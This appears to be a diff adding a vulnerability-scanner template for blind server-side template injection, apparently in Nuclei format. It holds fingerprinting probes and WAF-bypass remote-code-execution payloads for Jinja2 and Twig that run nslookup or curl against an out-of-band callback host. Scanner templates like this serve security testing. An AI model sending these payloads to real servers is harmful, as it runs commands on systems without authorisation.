@@ -1,0 +1,45 @@
+id: SSTI-ADV-01
+name: Advanced Server-Side Template Injection (Blind & OOB)
+severity: critical
+category: server-side
+metadata:
+  cwe: CWE-1336
+  tags: ["ssti", "rce", "oob", "waf-bypass"]
+
+variables:
+  interactsh_url: "{{interactsh-url}}"  # Provided by your engine / canary
+
+requests:
+  # Stage 1: Fingerprinting (Detect engine without triggering alert)
+  - method: GET
+    path:
+      - "{{BaseURL}}/?name=${7*7}"
+      - "{{BaseURL}}/?name=#{7*7}"
+      - "{{BaseURL}}/?name={{config}}"
+      - "{{BaseURL}}/?name={{_self.env.registerUndefinedFilterHandler('__exec')}}"
+    matchers:
+      - type: word
+        words:
+          - "49"
+          - "FreeMarker"
+          - "jinja2"
+          - "twig"
+        part: body
+    extractors:
+      - type: regex
+        name: engine_detected
+        regex:
+          - "Freemarker|Jinja2|Twig|Velocity"
+
+  # Stage 2: WAF‑Bypass & OOB DNS Exfiltration (Jinja2/Twig)
+  - method: GET
+    path:
+      # Payload using newlines and comments to bypass WAF rules
+      - "{{BaseURL}}/?name={% raw %}%7B%25%20set%20x%3Dcycler.__init__.__globals__.os.popen%20%25%7D%7B%7B%20x('nslookup%20{{interactsh_url}}')%20%7D%7D{% endraw %}"
+      # Twig OOB (exec + curl)
+      - "{{BaseURL}}/?name={{['curl%20{{interactsh_url}}']|sort('system')}}"
+    matchers:
+      - type: dns
+        domain: "{{interactsh_url}}"
+        part: interaction
+    matchers-condition: or
